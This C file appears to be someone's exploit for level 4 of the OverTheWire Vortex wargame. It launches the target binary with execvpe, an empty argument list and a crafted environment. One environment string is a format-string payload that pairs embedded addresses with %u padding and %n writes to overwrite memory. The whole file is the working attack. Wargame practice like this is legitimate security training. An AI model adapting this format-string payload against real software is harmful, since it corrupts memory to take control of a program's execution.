#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <debug.h>

char *newargs[] = { NULL };

char payload_buff[16777216];

char *newenv[] = { 
    "CCCC", 
    "BBBB", 
    "\x14\xa0\x04\x08\x15\xa0\x04\x08\x16\xa0\x04\x08\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u..%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%253u%n%n%n%n\x00\x00", 
    "\x14\xa0\x04\x08", 
};

int main(int argc, char *argv[]) {
    int fd = 0;
    int rc = 0;

    // check(argc == 2, "wrong number of args");

    // fd = open(argv[1], 'r');
    // check(fd, "could not open file");

    // rc = read(fd, payload_buff, sizeof(payload_buff));
    // check(rc, "could not read file %d", rc);

    // close(fd);

    // newenv[2] = payload_buff;
    rc = execvpe("/home/bmoar/git/hacking/otw/vortex/5/vortex4", newargs, newenv);
    check(rc != -1, "should not have failed to execvpe with newenv[2]");

error:
    exit(7);
}
